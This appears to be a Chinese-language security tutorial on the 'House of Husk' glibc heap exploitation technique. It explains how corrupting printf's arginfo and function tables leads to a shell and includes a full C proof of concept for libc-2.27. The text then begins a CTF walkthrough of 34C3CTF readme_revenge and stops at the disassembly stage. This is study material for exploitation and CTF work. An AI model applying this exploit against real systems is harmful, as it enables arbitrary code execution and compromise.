
```cpp
int
\_\_register\_printf\_function (int spec, printf\_function converter, printf\_arginfo\_function arginfo)
{
return \_\_register\_printf\_specifier (spec, converter, (printf\_arginfo\_size\_function\*) arginfo);
}
int
\_\_register\_printf\_specifier (int spec, printf\_function converter, printf\_arginfo\_size\_function arginfo)
{
// 不在 0~0xff 范围内则调用 \_\_set\_errno 并返回 -1
if (spec < 0 || spec > (int) UCHAR\_MAX)
{
\_\_set\_errno (EINVAL);
return -1;
}
int result = 0;
\_\_libc\_lock\_lock (lock);
if (\_\_printf\_function\_table == NULL)
{
// 若spec为空，程序则会通过calloc分配两个堆地址来存放
// \_\_printf\_arginfo\_table和\_\_printf\_function\_table
\_\_printf\_arginfo\_table = (printf\_arginfo\_size\_function \*\*)
calloc (UCHAR\_MAX + 1, sizeof (void \*) \* 2);
if (\_\_printf\_arginfo\_table == NULL)
{
result = -1;
goto out;
}
\_\_printf\_function\_table = (printf\_function \*\*)(\_\_printf\_arginfo\_table + UCHAR\_MAX + 1);
}
\_\_printf\_function\_table[spec] = converter;
\_\_printf\_arginfo\_table[spec] = arginfo;
out:
\_\_libc\_lock\_unlock (lock);
return result;
}
```

我们可以利用这样一条调用链 `printf->vfprintf->printf_positional->__parse_one_specmb`，通过篡改 `__printf_arginfo_table` 和 `__printf_function_table` 来进行攻击，可以看到当 `__printf_function_table` 非空，将会调用 `printf_positional` 函数。

```cpp
int
\_\_printf (const char \*format, ...)
{
va\_list arg;
int done;
va\_start (arg, format);
done = vfprintf (stdout, format, arg);
va\_end (arg);
return done;
}
int
vfprintf (FILE \*s, const CHAR\_T \*format, va\_list ap)
{
...
if (\_\_glibc\_unlikely (\_\_printf\_function\_table != NULL
|| \_\_printf\_modifier\_table != NULL
|| \_\_printf\_va\_arg\_table != NULL))
goto do\_positional;
...
do\_positional:
...
done = printf\_positional (s, format, readonly\_format, ap, &ap\_save,
done, nspecs\_done, lead\_str\_end, work\_buffer,
save\_errno, grouping, thousands\_sep);
...
}
static int
printf\_positional (\_IO\_FILE \*s, const CHAR\_T \*format, int readonly\_format,
va\_list ap, va\_list \*ap\_savep, int done, int nspecs\_done,
const UCHAR\_T \*lead\_str\_end,
CHAR\_T \*work\_buffer, int save\_errno,
const char \*grouping, THOUSANDS\_SEP\_T thousands\_sep)
{
...
nargs += \_\_parse\_one\_specmb (f, nargs, &specs[nspecs], &max\_ref\_arg);
...
extern printf\_function \*\*\_\_printf\_function\_table;
int function\_done;
if (spec <= UCHAR\_MAX
&& \_\_printf\_function\_table != NULL
&& \_\_printf\_function\_table[(size\_t) spec] != NULL)
{
const void \*\*ptr = alloca (specs[nspecs\_done].ndata\_args
\* sizeof (const void \*));
/\* Fill in an array of pointers to the argument values. \*/
for (unsigned int i = 0; i < specs[nspecs\_done].ndata\_args; ++i)
ptr[i] = &args\_value[specs[nspecs\_done].data\_arg + i];
/\* Call the function. \*/
function\_done = \_\_printf\_function\_table[(size\_t) spec](s, &specs[nspecs\_done].info, ptr);
...
}
}
size\_t
attribute\_hidden
\_\_parse\_one\_specmb (const UCHAR\_T \*format, size\_t posn,
struct printf\_spec \*spec, size\_t \*max\_ref\_arg)
{
...
if (\_\_builtin\_expect (\_\_printf\_function\_table == NULL, 1)
|| spec->info.spec > UCHAR\_MAX
|| \_\_printf\_arginfo\_table[spec->info.spec] == NULL
/\* We don't try to get the types for all arguments if the format
uses more than one. The normal case is covered though. If
the call returns -1 we continue with the normal specifiers. \*/
|| (int) (spec->ndata\_args = (\*\_\_printf\_arginfo\_table[spec->info.spec])
(&spec->info, 1, &spec->data\_arg\_type,
&spec->size)) < 0)
...
}
```

- 泄露 `libc` 地址。
- 修改 `global_max_fast` 为很大的值，可以 `large bin attack/unsorted bin attack`。
- 将 `__printf_function_table` 或者 `__printf_arginfo_table` 覆盖为指向写有 `one_gadget` 的内存的指针。其中 `one_gadget` 在内存中的偏移对应与之后触发漏洞的 `spec`。
- 如果是利用 `__printf_function_table` 触发漏洞，需要让 `__printf_arginfo_table` 指向一块内存，并且该内存对应 `spec` 偏移处设为 `null`，否则会在 `__parse_one_specmb` 函数的 `if` 判断中造成不可预知的错误。
- 最后调用 `printf` 触发漏洞获取 `shell`。

## 图解

对于 `glibc-2.27` 而言：

![图片描述](upload/attach/202311/958172\_E8Y26XSD5SK3R78.webp)

## <a href="elink@230K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3N6s2u0Q4x3X3c8&6N6h3c8S2K9g2)9J5k6h3S2S2N6r3g2F1j5h3u0D9L8$3N6Q4x3V1k6W2L8Y4c8J5P5g2)9J5c8U0t1H3x3U0m8Q4x3V1j5H3y4q4)9J5c8U0l9J5i4K6u0r3x3o6p5K6z5e0p5H3">POC</a>

```cpp
/\*
\* This is a Proof-of-Concept for House of Husk
\* This PoC is supposed to be run with libc-2.27.
gcc poc.c -o poc -no-pie -g
\*/
#include <stdio.h>
#include <stdlib.h>
#define offset2size(ofs) ((ofs) \* 2 - 0x10)
#define MAIN\_ARENA 0x3ebc40
#define MAIN\_ARENA\_DELTA 0x60
#define GLOBAL\_MAX\_FAST 0x3ed940
#define PRINTF\_FUNCTABLE 0x3f0738
#define PRINTF\_ARGINFO 0x3ec870
#define ONE\_GADGET 0x10a2fc
int main (void)
{
unsigned long libc\_base;
char \*a[10];
setbuf(stdout, NULL); // make printf quiet
/\* leak libc \*/
a[0] = malloc(0x500); /\* UAF chunk \*/
a[1] = malloc(offset2size(PRINTF\_FUNCTABLE - MAIN\_ARENA));
a[2] = malloc(offset2size(PRINTF\_ARGINFO - MAIN\_ARENA));
a[3] = malloc(0x500); /\* avoid consolidation \*/
free(a[0]);
// unsorted bin 泄露 libc
libc\_base = \*(unsigned long\*)a[0] - MAIN\_ARENA - MAIN\_ARENA\_DELTA;
printf("libc @ 0x%lx\n", libc\_base);
/\* prepare fake printf arginfo table \*/
/\* 'X'-2 mean that prev\_size | size \*/
\*(unsigned long\*)(a[2] + ('X' - 2) \* 8) = libc\_base + ONE\_GADGET;
// now \_\_printf\_arginfo\_table['X'] = one\_gadget;
/\*(unsigned long\*)(a[1] + ('X' - 2) \* 8) = libc\_base + ONE\_GADGET; \*/
/\* unsorted bin attack \*/
\*(unsigned long\*)(a[0] + 8) = libc\_base + GLOBAL\_MAX\_FAST - 0x10;
a[0] = malloc(0x500); /\* overwrite global\_max\_fast \*/
/\* overwrite \_\_printf\_arginfo\_table and \_\_printf\_function\_table \*/
free(a[1]);// \_\_printf\_function\_table => a heap\_addr which is not NULL
free(a[2]);// => one\_gadget
/\* ignite! \*/
printf("%X", 0);
return 0;
}
```

![图片描述](upload/attach/202310/958172\_Y3WP99GVPMB3WYD.webp)

# 例题 [[34C3CTF2017]readme_revenge](<mark class="encrypted">2a9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3V1k6o6g2p5k6Q4x3X3c8m8L8r3I4Q4x3X3c8u0L8W2)9J5k6p5!0F1k6g2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6K6M7X3y4Q4x3V1k6%4M7X3W2@1k6i4g2H3i4K6u0r3y4W2)9J5k6e0q4Q4x3X3f1I4x3#2)9#2k6Y4m8%4L8W2)9#2k6U0x3@1j5K6y4U0N6r3j5J5x3o6p5%4i4K6g2X3M7X3g2S2k6r3#2W2i4K6g2X3M7X3g2$3k6h3&6Y4k6g2)9J5z5b7`.`.</mark>

## 检查信息

![图片描述](upload/attach/202310/958172\_RFH6K8H3TDYUYG9.webp)

![图片描述](upload/attach/202310/958172\_SQRCZJHP9V6PQK2.webp)

静态编译并且没有去除符号。

## 试运行

![图片描述](upload/attach/202310/958172\_SBGU2CMAR8SEC3F.webp)

## 逆向分析

```assembly
.text:0000000000400A0D ; int \_\_cdecl main(int argc, const char \*\*argv, const char \*\*envp)
.text:0000000000400A0D public main
.text:0000000000400A0D main proc near ; DATA XREF: \_start+1D↑o
.text:0000000000400A0D
.text:0000000000400A0D var\_1020= qword ptr -1020h
.text:0000000000400A0D
.text:0000000000400A0D ; \_\_unwind {
.text:0000000000400A0D 55 push rbp
.text:0000000000400A0E 48 89 E5 mov rbp, rsp
.text:0000000000400A11 48 8D A4 24 E0 EF FF FF lea rsp, [rsp-1020h]
.text:0000000000400A19 48 83 0C 24 00 or [rsp+1020h+var\_1020], 0
.text:0000000000400A1E 48 8D A4 24 20 10 00 00 lea rsp, [rsp+1020h]
.text:0000000000400A26 48 8D 35 B3 69 2B 00 lea rsi, name
.text:0000000000400A2D 48 8D 3D 50 C7 08 00 lea rdi, unk\_48D184 ;%s
.text:0000000000400A34 B8 00 00 00 00 mov eax, 0
.text:0000000000400A39 E8 22 71 00 00 call \_\_isoc99\_scanf
.text:0000000000400A39
.text:0000000000400A3E 48 8D 35 9B 69 2B 00 lea rsi, name
.text:0000000000400A45 48 8D 3D 3B C7 08 00 lea rdi, aHiSBye ; "Hi, %s. Bye.\n"
.text:0000000000400A4C B8 00 00 00 00 mov eax, 0
.text:0000000000400A51 E8 7A 6F 00 00 call printf
.text:0000000000400A51
.text:0000000000400A56 B8 00 00 00 00 mov eax, 0
.text:0000000000400A5B 5D pop rbp
.text:0000000000400A5C C3 retn
.text:0000000000400A5C ; } // starts at 400A0D
.text:0000000000400A5C
.text:0000000000400A5C main endp
```

![图片描述](upload/attach/202310/958172\_NMJ8N372E6VNSQ2.webp)
